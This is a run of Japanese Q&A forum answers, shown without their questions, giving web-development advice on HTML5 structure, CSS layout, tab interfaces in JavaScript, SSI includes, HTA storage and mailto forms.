自分も No.2 さんと同意見で、ダブルコーテーションが全角文字なのが原因と考えます。 しかし、No.3 さんが明らかな間違いを発言されているので訂正いたします。 > なお、この現象には無関係ですが > <body> > 真夏のひまわり畑 > </body> > は、明らかな間違いです。 いいえ、この文は間違いではありません。確かに > HTMLの要素には、それぞれ内包できる要素が決められています。 のですが、 > body要素に、直接行内要素は、入りません。 という勘違いをなさっています。 この文書は HTML5 で書かれているため body 要素に直接入れられるものはフローコンテンツです。そして、フローコンテンツにはテキストが含まれています。 （参考URL） ・The body element - W3C http://www.w3.org/TR/html5/sections.html#the-bod … ・Flow content - W3C http://www.w3.org/TR/html5/dom.html#flow-content-1 ちなみに No.3 さんがご呈示の Another HTML Lint に質問者様がご呈示の HTML の引用符を修正しただけのものを判定させてみたところ 100 点満点でした。
firefoxなら、Table2Clipboard( https://addons.mozilla.org/ja/firefox/addon/dafi … )で・・
なぜ？「この質問は特に30代の方にリクエストされています！」かわからない。 60代ですが・・ 　.htaccessはサーバーに対するコマンドなので、影響はありません。単純にスマホのブラウザの問題です。階層もまったく関係ありません。
コンピューターの世界でタブというと、二つの意味があります。 -- 一つ目の意味「タブキーによる文字間隔空け」ならば、 HTML の標準機能では、タブ文字 (U+0009 CHARACTER TABULATION) は空白として扱われるので、 少々特殊な扱いをしなければいけません。 <pre> alpha&Tab;beta&Tab;gamma </pre> ですが、元はタイプライターの簡易図表作成機能なので、 HTML では表組みするのが正しい姿だと思います。 <style>table td { min-width:4em; }</style> <table> <tr><td> α <td> β <td> γ </table> -- 二つ目の意味「タブによる表示切替インターフェース」ならば、 HTML の標準機能には無いので、スタイル・スクリプトを自前で用意するしかありません <style> .tabpane nav { margin:0 0.5ex; } .tabpane nav a { text-decoration:none; min-width:4em; display:inline-block; padding:0 0.5ex; } .tabpane nav a { border-top:medium solid #444; background:#ddd; color:black; } .tabpane nav a:hover { background:#aaa; } .tabpane nav a.active { background:#444; color:white; } .tabpane .content { display:none; border:thin solid black; margin:0; padding:1ex; } .tabpane .content.active{ display:block; } </style> <script> document.addEventListener('click', function(ev,_){ _ ; function EACH(o,f){if (o) Array.prototype.forEach.call(o, f)} _ ; var a = ev.target; if (!a.href) return; _ ; var cmd = a.getAttribute('href'); if (!/^#.+/.test(cmd)) return; _ ; var e = document.getElementById(cmd.substr(1)); if (!e || !e.classList || !e.classList.contains('content')) return; _ ; var p = e.parentElement; _ ; while (p && !p.classList.contains('tabpane')) p = p.parentElement; _ ; EACH( p.querySelectorAll('.content.active, a.active'), function(x){x.classList.remove('active')} ); _ ; e.classList.add('active'); _ ; a.classList.add('active'); _ ; ev.preventDefault(); }, false); </script> <div class=tabpane> <nav> <a href=#alpha class='active'>α</a> <a href=#beta>β</a> <a href=#gamma>γ</a> </nav> <article class='content active' id=alpha> this is alpha. </article> <article class='content' id=beta> this is beta. </article> <article class='content' id=gamma> this is gamma. </article> </div>
方法１： サイドバーにある「共有」を開くと選択できる。 「＜＞自分のサイトに埋め込む」 方法２： テキストリンクで別窓で開く <a target="_blank" href="https://maps.google.co.jp/maps/ms?msid=～～～～～～～">●●の地図</a>
getParameterではなくgetAttributeを使って見ては・・・
ご提示の場合ですと txt の要素が二つあるので、 form.elements[name] は RadioNodeList 型で要素を返します。 根拠 https://www.w3.org/TR/html5/infrastructure.html# … なので、以下のように処理する必要があります。 var ts = form.elements['txt']; for (var i = 0; i < ts.length; i++) { _ ts[i].value = e.value; } もしくは、name が単体でも複数でも処理できるように form.elements[index] を使うことをお勧めします var ts = form.elements; for (var i = 0; i < ts.length; i++) { _ if (ts[i].name == 'txt') ts[i].value = e.value; }
ウェブで最も重要なことは、「構造とプレゼンテーションの分離( http://www.asahi-net.or.jp/%7Esd5a-ucd/rec-html4 … )」です。一度仕様書を通して読んでおかれるとよいでしょう。 　それは、文書構造滋養はリストですから、HTMLはリストとしてマークアップするべきでしょう。あなたの場合、それが順不同リスト(ul)、序列リスト (ol)、定義リスト(dl)のいずれが良いかは、文面では判断できませんが、そのいずれかになるでしょう。 　そうすることで、展示端末やスクリーンリーダーなどの視覚系ブラウザ以外にも、また検索エンジンにも正しく解釈できる。 　そのうえで、scrreenメディアに対して、そのデザインをすればよい。そのほうが訪問者はもちろん、著者自身のメンテナンスも容易になる。
301リダイレクトで旧ページを全てリダイレクト、良い方法です。 旧ページの評価資産を新ページに見た目は引き継ぐことが出来ますが、恒久的に301リダイレクトして置く必要があります。 「もう引き継がれたから、解除しても良いだろう」とは行きません。 301リダイレクト設定が有る事をgoogleが確認、有った場合のみレダイレクト先の資産と見做すだけです。
「#bodyの高さを％指定しているから」、が原因。 高さはコンテンツによって決まってしまうから%では0と同じ意味。 pxで指定するか、レスポンシブのやり方にする。 下はレスポンシブでのやり方の例 #body{ background:url("●●.jpg") repeat-y fixed; background-size:auto; ←追加 padding-bottom:50%;←重要追加：値は調整する。 overflow:auto; width:100%; height:0;　←必ず0にする。
<p><img src="●●●.gif" width="80" height="80" alt="*" style="vertical-align: middle;" /> <a href="a.html">リンク</a></p> <p><a href="a.html"><img src="●●●.gif" width="80" height="80" alt="*" style="vertical-align: middle;" /> リンク</a></p>
CSSをレスポンシブ対応にする。 現在のCSSを見て見ないと何とも言えないが、概略は以下。 htmlの<meta name="viewport"は全ページに入れる。 cssは min-width640px指定を止める。 CSSで横幅指定している部分は幅を%で指定する。 親要素に対する%、親要素が無い場合はブラウザの幅に対する%が適用される。 詳しいレスポンシブデザインのやり方は「レスポンシブ」で検索して下さい。
<section style="display:flex;"> <table border> <tr> <th>値11 <th>値12 <th>値13 <tr> <td>a11 <td>a12 <td>a13 <tr> <td>b11 <td>b12 <td>b13 <tr> <td>c11 <td>c12 <td>c13 </table> <table border> <tr> <th>値21 <th>値22 <th>値23 <tr> <td>a21 <td>a22 <td>a23 <tr> <td>b21 <td>b22 <td>b23 <tr> <td>c21 <td>c22 <td>c23 <tr> <td>d21 <td>d22 <td>d23 <tr> <td>e21 <td>e22 <td>e23 </table> </section> 参考 https://developer.mozilla.org/ja/docs/Web/CSS/CS …
ダメなところの「<font face="ヒラギノ明朝体3">」を「<font face="ヒラギノ明朝体3" style="line-height : 170%;">」のように修正されたら直ると思います。
HTA では localStorage/sessionStorage が使えない様です。 HTA の動作モードを最新の IE に合わせれば動くと思っていましたが、 <meta http-equiv="x-ua-compatible" content="IE=11"> IE 系統では file: スキーマの場合に Web ストレージ系が使用できない制限があるようなので、 HTA でも同様の制限が働いていると推測します。 HTA にてデータ保存を行うには ActiveX 経由で FSO をお使いください。 https://www.google.co.jp/search?q=hta+fso > 他のＯＳでの動作は難しいでしょうか？ HTA = IE + ActiveX無制限 + HTA独自タグ という存在なので、ActiveX が使えない OS 環境では意味がありません
既に回答ついちゃってますが… htmlメールを送信する際に生のHTMLタグを書くことはまずないです。 # SMTPサーバにtelnetクライアントで接続して、STMPプロトコルのおしゃべりでもしない限りは。 >それを試みたのですが、ソースがそのまま送られるだけで >失敗しました。 メールヘッダについて調べてみた方がいいでしょう。 Content-Typeヘッダとか。 普通に本文にHTML書いただけならContent-Typeはtext/plainでしょうね。 メーラにhtmlメールだと認識させる為にはtext/htmlとすべきです。 んで…… >「HTMLメールを受信しない」設定になっていたら、素のHTMLが表示されます。 たいていのメーラはhtmlメールを送信する際にtext/plainとtext/htmlのマルチパートで送信しているかと。 ということでhtmlメールを拒否していた場合はtext/plainの方を表示するようになっていると思われます。 # マルチパートで送られてこなければ、htmlソースの表示になる…かな？　タグだけ無視して表示するかも知れないけど。
No.1です。 　お仕事でのお話でしたか。 　でしたらこういった場所に聞くまでも無く、発注元に「ハイパーリンクはこういった書き方でお納めしてよろしいですか？」と伺えばよいのではないでしょうか。 　ちなみに。。。 > ＜ｉｍｇ ｓｒｃ＝”ｉｍｇ/○○○.ｇｉｆ”＞という形で納品しています。納品先が、ディレクトリを書き換えてアップロードしているようです。 　イメージ・タグがお客様のところで最終的にどういう書式となって発信されるかは理解されていますか？ 　公使でメールをお使いの場合、HTML型式のメールを受け取られることがあるかと思います。特に私的な場面では広告メールなどで。 　そのメールの内容をテキスト形式で（つまり生のHTMLで）見るとその辺が簡単にわかりますが、お仕事でHTML型式のメール作成をされていて、、そういったチェックをされたことはないのでしょうか？ 　それと、そもそもお客様に納めする前に画像や文章のレイアウトや各種書式が指定されたあるいは、考えた通りになっているかの確認をするかと思います。その範囲ではハイパーリンクは画像と同じことだと思いますが、確認をされていないのでしょうか？ 参考まで。
違う違う・・・。デザインのためにHTML書くから、困ったことになる。 HTMLには文書構造しか書かない。 　構造とプレゼンテーションの分離( http://www.asahi-net.or.jp/%7Esd5a-ucd/rec-html4 … ) 商品説明のリストでしょ。ナビゲーションかもしれない。 <ul id="ProductList"> 　<li><a href="">商品名<img src="" width="" height="" alt=""></a> 　<li><a href="">商品名<img src="" width="" height="" alt=""></a> だけでよい。 または、 <ul id="ProductList"> 　<li><a href=""><img src="" width="" height="" alt=""></a> 　　　<p><a href="">商品名</a></p> 　</li> 　<li><a href=""><img src="" width="" height="" alt=""></a> 　　　<p><a href="">商品名</a></p> 　</li> こうしておけば、デザインは自由になるし、UA(ユーザーエージェント）ごとにデザイン変えられるし、検索エンジンにも理解できるし、視覚障害者のスクリーンリーダーや点字端末にも利用できるし、なによりもメンテナンスが容易になる。 サンプル ★ Another HTML Lint - Gateway( http://www.htmllint.net/html-lint/htmllint.html# ) 　のDATA入力(右上)で検証済みのHTML5です。HTML5ではdivは原則使わない。 ★ 画像は縦横比 2:3で統一したものを想定しています。実サイズは任意 ★タブは＿に置換してあるので戻してください。 ★ウィンドウ幅を縮めてみてください。 <!doctype html> <html> <head> ＿<meta charset="utf-8"> ＿<title>サンプル</title> ＿<meta name="description" content=""> ＿<meta name="author" content="ORUKA"> <style media="screen"> <!-- html,body{margin:0;padding:0;} h1,h2,h3,p,ul{margin:0;line-height:1.6em;} header,section,footer{width:80%;min-width:760px;max-width:1000px;margin:0 auto;} section{position:relative;} section aside{position:absolute;top:0;right:0;width:200px;height:100%;} /* ここから、製品リストの整列 */ section h2, section p{margin-right:220px;} section ul.ProductList{ ＿margin:5px 220px 5px 0; ＿padding:0; ＿list-style:none; ＿text-align:center; ＿position:relative; } section ul.ProductList li{ ＿display:inline-block; ＿width:32%; ＿background-color:rgb(255,255,0); ＿position:relative; ＿border:solid 1px black; ＿box-shadow:10px 10px 10px rgba(0,0,0,0.4); ＿margin-bottom:10px; } section ul.ProductList li img{ ＿width:90%;height:auto; } section * p{ ＿margin:5px; ＿padding:5px; ＿width:90%; } /* わかりやすいように色分け */ body{background-color:gray;} header,footer{background-color:aqua;} section{background-color:white;} aside{background-color:yellow;} /* スマホ */ @media (max-width:820px){ ＿section ul.ProductList li{width:49%;} ＿header,section,footer{width:100%;min-width:480px;} } /* スマホ縦 */ @media (max-width:640px){ ＿section aside{position:static;width:auto;height:auto;} ＿section h2,section p,section ul.ProductList{margin-right:0;} ＿header,section,footer{min-width:0;} } --> </style> </head> <body> ＿<header> ＿＿<h1 id="title">Your title</h1> ＿＿<nav> ＿＿＿<ul> ＿＿＿＿<li><a href="/">Top</a></li> ＿＿＿＿<li><a href="#Products">製品</a></li> ＿＿＿＿<li><a href="/links">リンク</a></li> ＿＿＿</ul> ＿＿</nav> ＿</header> ＿<section id="Products"> ＿＿<h2>製品情報</h2> ＿＿<ul class="ProductList"> ＿＿＿<li><a href=""><img src="./images/1.jpg" width="320" height="240" alt="サンプル写真"></a> ＿＿＿＿<p><a href="">商品１</a></p> ＿＿＿</li> ＿＿＿<li><a href=""><img src="./images/2.jpg" width="320" height="240" alt="サンプル写真"></a> ＿＿＿＿<p><a href="">商品２</a></p> ＿＿＿</li> ＿＿＿<li><a href=""><img src="./images/3.jpg" width="320" height="240" alt="サンプル写真"></a> ＿＿＿＿<p><a href="">商品３</a></p> ＿＿＿</li> ＿＿＿<li><a href=""><img src="./images/4.jpg" width="320" height="240" alt="サンプル写真"></a> ＿＿＿＿<p><a href="">商品４</a></p> ＿＿＿</li> ＿＿＿<li><a href=""><img src="./images/5.jpg" width="320" height="240" alt="サンプル写真"></a> ＿＿＿＿<p><a href="">商品５</a></p> ＿＿＿</li> ＿＿＿<li><a href=""><img src="./images/6.jpg" width="320" height="240" alt="サンプル写真"></a> ＿＿＿＿<p><a href="">商品６</a></p> ＿＿＿</li> ＿＿</ul> ＿＿<aside> ＿＿＿<h3>Something aside</h3> ＿＿＿<p> ＿＿＿＿ここは、本文と直接関係ないasideな記事 ＿＿＿</p> ＿＿</aside> ＿</section> ＿<footer> ＿＿<h3>A nice footer</h3> ＿</footer> </body> </html>
＞C++でHTMLをやっているのですが 　まったく意味が分からないのですが、HTMLは、マークアップ言語ですよ。C++でHTMLを出力しているということ？？ 　だとしたら、C++はこの質問には関係ないですよ。単にHTMLの書き方だけ知ればよい。 　どちらかというとjavascriptですよ。C++でHTMLを書き出して、それをjavascriptで処理する。いちいちクリックのたびにサーバーにアクセスしてもよいけど、あまり実用的ではない。
＞Yahooストアにバナーを貼る為に、tableを組んでいました。 　それを先に言ってくれなきゃ・・(^^) 　なら、単純にHTMLの書き間違い。 <table cellspacing="0" cellpadding="0" width="780"> 　<tr> 　　<td colspan="3"> 　　　<img src="Banner_big.jpg" width="780" height="200"> 　　　<td> 　</tr> 　<tr> 　　<td width="387"> 　　　<img src="Banner_small.jpg" width="387" height="200"> 　　　<td> 　　　　<td width="6"></td> 　　　　<td width="387"> 　　　　　<img src="Banner_small.jpg" width="387" height="200"> 　　　　　<td> 　　</tr> </table> だとブラウザは <table cellspacing="0" cellpadding="0" width="780"> 　<tr> 　　<td colspan="3"> 　　　<img src="Banner_big.jpg" width="780" height="200"> 　　　<table> 　　　　<tr> 　　　　　<td> 　　　　　<td><!-- 補完 --> 　　　　</tr> 　　　　<tr> 　　　　　<td width="387"> 　　　　　　<img src="Banner_small.jpg" width="387" height="200"> 　　　　　<table><!-- 補完 --> 　　　　　　<tr><!-- 補完 --> 　　　　　　　<td width="6"></td> 　　　　　　　<td width="387"> 　　　　　　　　<img src="Banner_small.jpg" width="387" height="200"> 　　　　　　　　<table><!-- 補完 --> 　　　　　　　　　<tr><!-- 補完 --> 　　　　　　　　　　<td> 　　　　　　　　　　</td><!-- 補完 --> 　　　　　　　　　</tr> </table>
他エディタというのは、そういう意味ではなくて 市販、ネットでダウンロード,AppStoreで入手等するもののことです。 昔からの定番 mi https://www.mimikaki.net/ 私が最近ちょっとした書き物に使っているのは CotEditor (App Storeで入手) 等です。 これらだと、タグやコメントが別の色で表示されたり、空白を記号で表示したりといった、HTMLやJavascriptを書く上で便利な機能が付いています。
No.2です。 > すみません。こちらのサイトは無限スクロールではないのですが2ページ目以降のHTMLが取得できません。 > https://www.missguided.co.uk/dresses#dir=desc&or … > これも同じ技術でしょうか？ 　指定条件に合った商品の一覧を1画面目、1画面目で「次ページ」とか「もっと」とかのボタンクリックすると2画面目・・・と表示するのはもっと簡単な方法で出来ます。 　一番簡単なのはサーバ側のプログラムで以下のような処理を行うことです。 (1) 1画面目のHTMLの送出処理 　1)Webブラウザからの指定条件を受け取り、条件に合った商品を検索し、商品番号順等に並べた結果をデータベースから抽出する。 　2)上記の結果のうち先頭から予め決められた（あるいは1)でWebブラウザから受け取った1画面の表示件数にしたがった）件数分の商品情報を掲載した画面のHTMLを送出する。 　3)送出する画面（またはHTTP Cookie）に1画面の表示件数、1画面目であること（または画面の一番下にある商品の商品番号など）や、場合によっては1)で受け取った指定条件を仕込む。 (2) 2画面目以降のHTMLの送出処理 　1)Webブラウザから現時点でWebブラウザに表示されている画面に(1)-3)で仕込んだ情報を受け取る。 　2)受け取った情報にしたがって次に表示すべき表新情報をデータベースから抽出する。 　以降の処理は基本的に(1)-2以降と同じ。 　で。(1)-1)での指定条件に合った全商品の情報を得ましたが、jQueryなどを用いて動的に画面に商品を足し込んだり2画面目といった画面遷移をさせる際に再度同じ検索を行うのか、(1)-1)での結果をサーバ側に何らかの保存して置き、同じ利用者から「次」とか「もっと」という要求を受けた際には再度データベースを検索せずに保存している情報を用いるのかとかいったとことも処理のポイントです。 　そこは全体の処理速度を重視するんだとか、商品の更新頻繁なんだとか、そういった各種の「都合」も加味して決めねばならないところです。 　といったようなことも実システムとするにはあるわけですが。。。 　まず「こんな表示機能のWebサイトにしたい」という表示機能をまとめ、それはどんな処理の流れで実現出来るかを考える技術的裏付けに基づいた力（思考力あるいは設計力）が必要です。 　HTMLは単にWebブラウザ上に表示する1枚の画面デザインを記述する言語でしかなく、実際の動き、、、この場合「一覧画面の一番下まで来たら自動的に続きを足し加えるとか、次のページや前のページに移動するボタンがあり利用者がそれらをクリックしたら画面が遷移するとか」はWebブラウザに表示された画面（HTML）に組み込まれたスクリプトやサーバ側に置かれたプログラムの処理です。これらはHTMLではなく様々なプログラム言語で記述されるものです。 　ですので動的にデータを表示するWebサイトを作るにはHTMLに加えWebアプリケーションの開発言語を知らねばならないでしょうし、その前にまずHTTP通信とはどんなものか、利用者を識別するなご動きを制御するための情報をWebブラウザ側に伝え、それを受け取るためにはどんな機能（仕組み）があるのかといった基本的なことを学ぶことが必要でしょう。 参考まで。
私はワードを持っていないので試せませんが、WORDで保存したhtmlファイルをTeraPadで読み込めば正体が判明すると思います。 　試しにオフィース互換ソフトで中身が空の状態（1文字も打ち込んでいない）でhtml形式を選択すると中身が以下のような状態で保存されていました。 <html xmlns:v="urn:schemas-microsoft-com:vml"><head><meta content="text/html; charset=utf-8" http-equiv="Content-Type"><title></title><!--[if !mso]><style> /*vml*/ v\:* {behavior:url(#default#VML);} o\:* {behavior:url(#default#VML);} w10\:* {behavior:url(#default#VML);} .shape {behavior:url(#default#VML);} </style><![endif] --><style><!-- span.a2 {font-family:ＭＳ 明朝;font-size:10.0pt;} p {margin-top:0pt;margin-bottom:0pt;text-align:justify;text-justify:inter-ideograph;font-family:ＭＳ 明朝;font-size:10.0pt;} table.a3 {margin-left:0.0;border-collapse:collapse;padding:0.0pt 5.4pt 0.0pt 5.4pt;border-top:none;border-left:none;border-bottom:none;border-right:none;font-family:ＭＳ 明朝;font-size:10.0pt;}--></style></head><body style="margin-left:0pt;margin-top:0pt;margin-right:0pt;margin-bottom:0pt;"><div style=""><p style="margin-top:0pt;margin-bottom:0pt;"></p></div></body></html>
＞古いもののはずなので今普通にやってれば開けるわけではないのですか？ 「GA3DSimulator.html」をダブルクリックしたらIEが立ち上がると思うのですがどうですか？ ダメならIEを立ち上げてGA3DSimulator.htmlをドロップ（アイコンをIEの画面の上に持ってきて離す）してみてください。
ご利用のサーバーを借りてらっしゃるＩＳＰのマニュアルを確認してください。 もしくは、下記ファイルを上げて確認してください。 ★タブは＿に置換してあるので戻してください。 ★文字コードはUTF-8 ★/SSI/header_navigationList.htm ↑ 　サーバーのルートからのパス・・/SSI/ディレクトリに"header_navigationList.htm"というファイル名で保存するという意味 /index.shtml <!doctype html> <html> <head> <meta charset="utf-8"> <title>SHTMLtest</title> <style media="screen"> <!-- header,section,footer{ margin:0;padding:0; width:90%;min-width:640px;max-width:1000px; margin:0 auto; } section{ position:relative; } section h2,section p,section section{ margin-left:220px; } section nav{ position:absolute; top:0;left:0; width:200px; padding:5px; height:100%; } section section{ margin:0; width:auto;min-width:0; min-height:400px; } /* 色づけ */ body{background-color:gray;} header{background-color:aqua;} section{background-color:silver;} section section{background-color:white;} section nav{background-color:yellow;} footer{background-color:orange;} --> </style> </head> <body> ＿<header> ＿＿<h1 id="title">Your title</h1> ＿＿<nav> <!--#include virtual="/SSI/header_navigationList.htm" --> ＿＿</nav> ＿</header> ＿<section> ＿＿<h2>本文</h2> ＿＿<section id="A"> ＿＿＿<h3>項目タイトル</h3> ＿＿＿<p>この項目の記事</p> ＿＿</section> ＿＿<section id="B"> ＿＿＿<h3>項目タイトル</h3> ＿＿＿<p>この項目の記事</p> ＿＿</section> ＿＿<section id="C"> ＿＿＿<h3>項目タイトル</h3> ＿＿＿<p>この項目の記事</p> ＿＿</section> ＿＿<nav> <!--#include virtual="/SSI/section_contentTable.htm" --> ＿＿</nav> ＿</section> ＿<footer> ＿＿<h3>A nice footer</h3> ＿</footer> </body> </html> /SSI/header_navigationList.htm ＿＿＿<ul> ＿＿＿＿<li><a href="/">TOP</a></li> ＿＿＿＿<li><a href="/Books">著書</a></li> ＿＿＿＿<li><a href="/Contact">問い合わせ</a></li> ＿＿＿＿<li><a href="/Profile">プロフィール</a></li> ＿＿＿</ul> /SSI/section_contentTable.htm ＿＿<h2>目次</h2> ＿＿<nav> ＿＿＿<ul> ＿＿＿＿<li><a href="#A">A</a></li> ＿＿＿＿<li><a href="#B">B</a></li> ＿＿＿＿<li><a href="#C">C</a></li> ＿＿＿</ul> ＿＿</nav>
＞文字化けしてしまいます。 　それは、あなたのパソコン--ブラウザ---で、その文字があるフォントを示せないだけです。 　ここで質問された「ㄅ ㄆ ㄇ ㄈ.....」は、ちゃんと表示されているのでは。 　台湾は「繁体字」なのですが・・。 HTML5てしたら 　本文は日本語でしたら <!doctype html> <html> <head> <meta charset="utf-8"><!-- デフォルトなので書かなくてよい --> あとは、適宜指定すればよいはずですが・・
＞微妙に文章がずれます。 フォントが違うとか？ 知った上でしたらすみませんが質問文ではわからないので敢えて。 「プロポーショナルフォント」という、文字毎に幅が異なるフォント と そうでない文字によらず幅が一定なフォント が あります。 コピペで貼り付ける時、大抵はフォント情報は伝わらないので コピペ前後でこのフォントのタイプが異なれば当然ずれが発生します。 ＞改善方法 「プロポーショナル」の方を、そうでないフォントに設定しましょう。 Windows のフォント設定では「P」が付いてると思います。 （最近のWindowsでは知らないです。変わってるかも） コード書きならカラム位置が揃ってる方がなにかといいですし。
私は使っていませんが、 1) ツールバーの[実行]またはメニューバーから「実行(R)」、または「Ctrl+F11キー」 2) 実行アイコン右▼からブラウザを選択
付けない場合の制限ですが、 以下に詳しく書いてありますのでご一読ください。 8.1.2.3 Attributes の "Unquoted attribute value syntax" あたりです https://www.w3.org/TR/html5/syntax.html#attribut … より厳密に知りたいなら、ブラウザの実装方法まで指示しているぐらい詳細な情報もあります。 https://www.w3.org/TR/html5/syntax.html#attribut …(unquoted)-state
あなたがお使いのPCで自分宛てに送るのならできなくはないですが、不特定の生徒に入力してもらって、それを自分に送信させるとなると、サーバー側のプログラムを使わないと無理です。それなら、ずっと簡単です。 　そもそも、<form action="mailto: なんて、・・ 【引用】＿＿＿＿＿＿＿＿＿＿＿＿ここから action = uri [CT] 　この属性は、フォーム処理エージェントを指定する。 　^^^^^^^^^^^^^^^^^^^^^^^^^^^^ 　HTTPスキームURI以外の値の場合のユーザエージェントの動作は、定義しない 　^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^ ￣￣￣￣￣￣￣￣￣￣￣￣￣ここまで［Forms in HTML documents (ja)( http://www.asahi-net.or.jp/%7Esd5a-ucd/rec-html4 … )］より となっていて、使用しているユーザーエージェント(ブラウザなど)に依存します。そのブラウザを使用している人が、mailt:スキームにメールソフトを指定していれば可能ですが、メールソフトも色々・・ 　そのために、サーバー側のプログラムで処理して送信するのです。携帯電話だろうがスマホだろうが、chromeだろうがIEだろうが、firefoxだろうが・・ ご利用のプロバイダーにメール処理プログラムは使えるようになっているはずです。 例えばniftyでしたら、 自作のCGIをご利用いただけます 　■お問い合わせフォームやアンケートフォームを設置したい( http://homepage.nifty.com/_service/cgi.htm ) プログラムは CGI RESCUE - CGIフリーソフト( http://www.rescue.ne.jp/#PlagClose7 ) などいろいろなサイトで配布されています。 　私も最初にウェブサイト(ホームヘージ)を作った時に、最初に作ったのがフォームを使ってメールを送信するものでした。20年近く前で45歳だったかな。今ほど情報のない時代、このサイトを活用させていただいたものです。 ★今では、そもそもそんなことしなくても フリー フォームメールサービス - Google 検索( https://www.google.co.jp/search?q=%E3%83%95%E3%8 … ) 　をご覧になるとわかるように、たくさんのサービスもありますしね。
<form action="mailto:aaa@bbb.ccc" method="post" enctype="text/plain"> ↓ <form action="mailto:メールアドレス" method="post" enctype="text/plain"> にしたんですね。 「メールアドレス」は半角文字ですか？
CSSファイル内に、 ―――――――――――――――――― #sub{ 　box-sizing: border-box; 　overflow:hidden; 　float:left; 　width:30%; 　background:#000000; 　margin-bottom:-32768px; 　padding-bottom:32768px; } ―――――――――――――――――― という記述があると思うのですが、それの、 ―――――――――――――――――― 　margin-bottom:-32768px; 　padding-bottom:32768px; ―――――――――――――――――― という部分が原因かも知れません。 WEB検索してみましたら、これは、「メインコンテンツとサイドバーの高さを揃えるスタイル」のようです。 製作者が、両者の高さが違うと見栄えが悪いので、このスタイルを使ったのかも知れません。 一度、そちらの実際のデザインで、その部分を削除して検証してみてください。
誤解されているようですが、このような掲示板は、あなただけではなく、多くの方が参照されます。まさに、「どこかの誰かが、 ひとたび文書、データベース、画像、音声、動画あるいはある程度まで インタラクティブな画面を準備したなら、」なのです。 　なので、あなただけを対象にした回答を書くわけにはいかないのです。できるだけ正確に書こうとすると、否が応でもむつかしい面が出てくるのです。 　そしてウェブは初心者だからと言って差別もされませんし、開けて通してもくれないのです。完全に平等な社会なのです。 　私がこの世界に入ったときに、このような初心者に親切な場所なんてなくて、ニュースグループやメーリングリストしかない時代。何か聞くと「man!」とだけ帰ってきた。「manual(英文)を読め!」という意味。泣く泣く辞書と首っ引きで調べたものです。 　そして今のウェブの根幹をなす思想は知っておいてほしいのです。 　これは参考になりそうだと思ったらリンクで紹介する。・・でよいのですよ。
希望の画像を右クリックする →[名前を付けて画像を保存]をクリックする →保存するホォルダを選択する →[保存]をクリックする
「１点あたりの内容の濃さは同じ」なら関係ありません。 大事なことは、その内容が検索エンジンに伝わるように、きちんとマークアッフされていて、かつ他にはないほど充実した--秀逸な内容だったら
文字だけ・・・ もしかして.txt形式で保存してませんか？ Webページのように表示するには.html形式で保存する必要があります。 メモ帳で作成したファイルの拡張子(.txt)が見えているなら.htmlに変更してください。 見えていない場合は １．一度メモ帳を開いて「名前をつけて保存」 ２．ファイル名を~~.htmlにする
こんな感じです https://developer.mozilla.org/ja/docs/Web/HTML/U …
まず、なぜtableがまずいのか・・ 「単に文書内容を整形する目的だけで表を用いるべきでない。( http://www.asahi-net.or.jp/%7Esd5a-ucd/rec-html4 … )」 「ページレイアウトの目的で表を用いる。( http://www.asahi-net.or.jp/%7Esd5a-ucd/rec-html4 … )」 よく読んでおきましょう。・・そのデータが表の時はtableでなければならない。 今度はHTML、今から16年前のHTML4.01の勧告以前から、「構造とプレゼンテーションの分離( http://www.asahi-net.or.jp/%7Esd5a-ucd/rec-html4 … )」が言われ続けてきた。HTML4.01の最大の目的がこの「構造とプレゼンテーションの分離」と言ってよいでしょう。 　たとえtableだとしても 　<table class=rire1><----※ 　<td class=rire2><---※ 　　のようなclass名はつけません。 　HTML4.01では文書構造を示す要素(タグ)が乏しいので、下記のように 「id属性及び class属性と併用することで、文書に構造を付加する( http://www.asahi-net.or.jp/%7Esd5a-ucd/rec-html4 … )」ものなのです。 HTML4.01だと 　<table summary="なんたらの表"><----※summaryはHTML5にはない。titleをつかう。 　<td class="number"><---※ 　　としておくと、先でメンテナンスも楽でしょ。 HTML5だと、 <body> 　<header><!-- HTML5で新たに導入された文書構造を示すための要素 --> 　　<h1>このヘージの見出し</h1> 　　<nav><!-- HTML5で新たに導入された文書構造(ナビゲーションを示す)要素 --> 　　　<ul> 　　　　<li>2016/02/28 　　　　　<ul> <!-- コンテンツでない装飾のための画像(アイコン)などはHTMLには書きません --> 　　　　　　<li><a href="./page15.html">No.0001「コメント1」</a></li> 　　　　　　<li><a href="./page14.html">No.0001「コメント1」</a></li> 　　　　　　<li><a href="./Page13.html">No.0003「コメント3」</a></li> 　　　　　</ul> 　　　　</li> 　　　　<li>2016/02/27 　　　　　<ul> 　　　　　　<li><a href="./page12.html">No.0001「コメント1」</a></li> 　　　　　　<li><a href="./page11.html">No.0001「コメント1」</a></li> 　　　　　　<li><a href="./Page10.html">No.0003「コメント3」</a></li> 　　　　　</ul> 　　　　</li> 　　<nav> 　</header> 　<section><!-- HTML5で導入された文書構造(本文--アウトライン)を示す要素 --> 　　<h2>原子とは</h2> ・・・・・ ・・・・・ 　</section> 　<footer> 　　文書のフッター 　</footer> </body> と、デザインは一切考えず、ひたすら文書構造をマークアッフしていきます。 　　￣￣￣￣￣￣￣￣￣￣￣￣￣￣￣￣￣￣￣￣￣￣￣￣￣￣￣￣￣￣￣￣ HTML4.01では、divやspanにidやclassを併用して文書構造を示すことになっていました(前出)が、これはなかなか理解されず、<div class="outline">とか<div class="left">などのような使われ方をされてきました。 　そのためHTML5では、文書構造を示す<article><header><section><footer><aside><nav><figure><figcaption><main>など、文書構造を示す要素が追加されました。 　　3.1 New Elements( https://www.w3.org/TR/html5-diff/#new-elements ) 　文書構造を示す要素が追加されたために、divは安易に使えなくなりました。【重要】 NOTE: Authors are strongly encouraged to view the div element as an element of last resort, for when no other element is suitable. Use of more appropriate elements instead of the div element leads to better accessibility for readers and easier maintainability for authors. 　( https://www.w3.org/TR/html5/grouping-content.htm … ) 「注意：著者は、他により適切な要素がないときの最後の手段としてdiv要素を使用することを強く推奨する。div要素の代わりに、適切な要素を使用することは、読者のためにはより良いアクセシビリティを、著者にはのために容易なメンテナンス性につながります。」 　さて、スタイルシートですが、CSS2の勧告以来、起点となるセレクタを最初に書くことになりました。 .rire1 {　　　詳細度 0010 ではなく table.rire1 {　詳細度 0011 のように・・ 　.rire1 {　は、*.rire1 { と解釈されます。*は詳細度 0 です。 でスタイルシートは header nav ul{ 　list-style-type: none; 　margin:1em 0; 　padding:0; 　text-align:center; } header nav ul li{ 　margin:0; 　padding:0; 　position:relative; } header nav ul li ul li a:before{ 　position:absolute; 　left:-80px; } header nav ul li ul li a[href="./page15.html"]:before{ 　